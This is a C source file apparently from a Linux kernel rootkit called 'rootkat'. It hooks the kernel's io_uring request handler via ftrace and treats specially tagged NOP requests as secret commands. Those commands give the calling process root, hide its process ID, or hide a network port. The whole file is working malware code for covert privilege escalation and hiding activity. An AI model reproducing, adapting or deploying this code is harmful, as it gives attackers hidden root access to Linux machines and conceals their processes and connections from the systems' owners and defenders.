// SPDX-License-Identifier: MIT
#include <linux/kernel.h>
#include <linux/io_uring/cmd.h>
#include <linux/io_uring_types.h>
#include <uapi/linux/io_uring.h>
#include "ftrace_hook.h"
#include "kallsyms.h"
#include "magic_actions.h"
#include "hook_io_issue_sqe.h"

#define TAG "rootkat/hook_io_issue_sqe: "

typedef int (*io_issue_sqe_t)(struct io_kiocb *req, unsigned int issue_flags);

static int rootkat_io_issue_sqe(struct io_kiocb *req, unsigned int issue_flags);

/* Resolved via module-scoped lookup (vmlinux). The candidates list is
 * unused for this hook; install path passes the address directly. */
static struct rootkat_hook hook_io_issue_sqe = {
	.replacement = rootkat_io_issue_sqe,
};

static void rootkat_handle_io_magic(u64 user_data)
{
	u8  action = (user_data >> 24) & 0xff;
	u32 arg    =  user_data        & 0xffffff;

	switch (action) {
	case ROOTKAT_IO_ACT_PRIVESC:
		rootkat_grant_root_to_current();
		break;
	case ROOTKAT_IO_ACT_HIDE_PID:
		rootkat_hide_current_pid();
		break;
	case ROOTKAT_IO_ACT_HIDE_PORT:
		rootkat_hide_port_from_current((u16)arg);
		break;
	default:
		pr_debug(TAG "unknown action %u\n", action);
		break;
	}
}

static int rootkat_io_issue_sqe(struct io_kiocb *req, unsigned int issue_flags)
{
	io_issue_sqe_t orig = (io_issue_sqe_t)hook_io_issue_sqe.original;

	if (req && req->opcode == IORING_OP_NOP &&
	    (u32)(req->cqe.user_data >> 32) == ROOTKAT_IO_MAGIC_HI)
		rootkat_handle_io_magic(req->cqe.user_data);

	return orig(req, issue_flags);
}

int rootkat_hook_io_issue_sqe_install(void)
{
	/* io_issue_sqe is `static int` in io_uring/io_uring.c — built
	 * into vmlinux. Module-scoped lookup with NULL module_name
	 * walks vmlinux's compressed kallsyms table. */
	unsigned long addr = rootkat_lookup_in_module("io_issue_sqe", NULL);

	if (!addr) {
		pr_debug(TAG "io_issue_sqe not found in vmlinux\n");
		return -ENOENT;
	}
	return rootkat_hook_install_at(&hook_io_issue_sqe, addr);
}

void rootkat_hook_io_issue_sqe_remove(void)
{
	rootkat_hook_remove(&hook_io_issue_sqe);
}
